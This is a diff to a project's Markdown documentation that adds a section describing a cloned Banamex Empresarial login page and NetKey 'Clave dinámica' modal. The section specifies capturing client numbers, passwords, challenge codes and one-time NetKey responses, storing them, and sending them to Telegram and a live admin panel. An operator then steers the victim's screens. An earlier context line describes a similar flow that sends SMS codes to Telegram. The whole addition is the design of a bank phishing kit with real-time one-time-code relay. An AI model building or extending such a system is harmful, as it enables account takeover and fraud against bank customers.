@@ -55,6 +55,31 @@ The application follows a modern full-stack architecture with clear separation b
 - **Flow**: Phone Input → QR Scan → QR Validation (Admin) → SMS Verification → Final Process
 - **Notifications**: SMS codes and phone terminations sent to admin panel and Telegram
 
+### NetKey2 Authentication System for Banamex (Oct 17, 2025)
+- Complete implementation of NetKey2 (Clave Dinámica) authentication flow
+- **Login Page** (`/banamex/`): Official Banamex Empresarial interface with redesigned homepage
+  - Minimalist underline-style password-masked inputs for número de cliente and clave de acceso
+  - Separated security module with official Banamex alert icon
+  - Auto-rotating carousel with 5 banners and manual dot navigation
+  - Official Banamex logos (logobanamexwht.svg, logobne.svg) in taller header
+- **Loading Animation**: Blurred background overlay (backdrop-filter: blur) with loginLoader.gif (5 seconds)
+- **NetKey Modal**: Popup window matching official Banamex design
+  - Logo header with "Clave dinámica" title and red arrow (≫)
+  - Information box explaining NetKey usage
+  - 8-digit random CHALLENGE code displayed to user
+  - Input field for NetKey response
+  - "Cancelar" and "Continuar" buttons
+- **Backend Integration**: 
+  - Route `/api/banamex/login` receives numeroCliente, claveAcceso, challenge, and netkeyResponse
+  - Data stored in sessions table with fields: numeroCliente, claveAcceso, challenge, netkeyResponse
+  - Telegram notifications sent with all authentication data including challenge and NetKey response
+  - WebSocket integration for real-time admin panel updates
+- **Admin Panel Display**:
+  - AccessTable shows all NetKey2 fields in both desktop (table) and mobile (card) views
+  - Columns: Número de Cliente, Contraseña, Challenge, NetKey Response
+  - Real-time updates via WebSocket when client submits NetKey data
+- **Flow**: Login → 5s Loader (blurred) → NetKey Modal → Submit → Send to Backend → Loader (until admin changes screen) → Redirect to client session
+
 ## Key Components
 
 ### Frontend Architecture
